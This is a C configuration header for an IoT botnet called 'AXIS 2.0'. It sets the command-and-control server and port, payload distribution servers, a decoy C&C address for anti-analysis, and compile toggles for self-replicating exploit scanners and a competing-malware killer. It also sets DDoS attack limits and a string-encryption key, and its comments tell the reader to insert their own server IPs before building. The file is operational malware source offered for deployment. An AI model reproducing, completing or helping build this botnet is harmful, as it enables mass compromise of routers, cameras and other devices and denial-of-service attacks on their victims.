/*
 * AXIS 2.0 Botnet - Unified Configuration Header
 * ============================================================================
 * CRITICAL: Change all 0.0.0.0 placeholders to your server IP before building!
 * 
 * Features:
 * - KILLER: Anti-malware killer (eliminates competing botnets)
 * - SELFREP: Self-replication scanners (13 exploit modules)
 * - WATCHDOG: Hardware watchdog maintenance
 * 
 * Attack Methods: 16 optimized L4/L7 DDoS vectors
 * Scanner Targets: Global IoT devices, routers, cameras
 * ============================================================================
 */

#ifndef _CONFIG_H
#define _CONFIG_H

/* ============================================================================
 * SERVER CONFIGURATION - CHANGE THESE VALUES FOR YOUR INFRASTRUCTURE
 * ============================================================================ */

// C&C Server address (IP or domain)
// CHANGE THIS: 0.0.0.0 is placeholder - set to your C&C server IP
#define CNC_ADDR "0.0.0.0"
#define CNC_PORT 3778

// Scan results callback
#define SCAN_CB_PORT 9555

// HTTP/TFTP server for binaries
// CHANGE THIS: 0.0.0.0 is placeholder - set to your HTTP server IP
#define HTTP_SERVER "0.0.0.0"
#define HTTP_SERVER_IP "0.0.0.0"
#define HTTP_PORT 80
#define TFTP_SERVER "0.0.0.0"

/* ============================================================================
 * BOT CONFIGURATION
 * ============================================================================ */

// Single instance check port
#define SINGLE_INSTANCE_PORT 23455

// Fake C&C for anti-analysis
#define FAKE_CNC_ADDR "176.123.26.89"
#define FAKE_CNC_PORT 23

// Compile-time options - ENABLE THESE FEATURES
//#define KILLER      // Enable competing malware killer
//#define SELFREP     // Enable self-replication scanners
//#define WATCHDOG    // Enable hardware watchdog maintenance

/* ============================================================================
 * ATTACK CONFIGURATION
 * ============================================================================ */

#define ATTACK_CONCURRENT_MAX 15
#define SCAN_RAW_PPS 384
#define SCANNER_MAX_CONNS 256

/* ============================================================================
 * SCANNER CREDENTIALS (sample - full list in table.c)
 * ============================================================================ */

/* ============================================================================
 * KILLER TARGETS (ports used by competing malware)
 * ============================================================================ */

#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 600

/* ============================================================================
 * STRING TABLE ENCRYPTION
 * ============================================================================ */

#define TABLE_KEY 0xdeadbeef

#endif
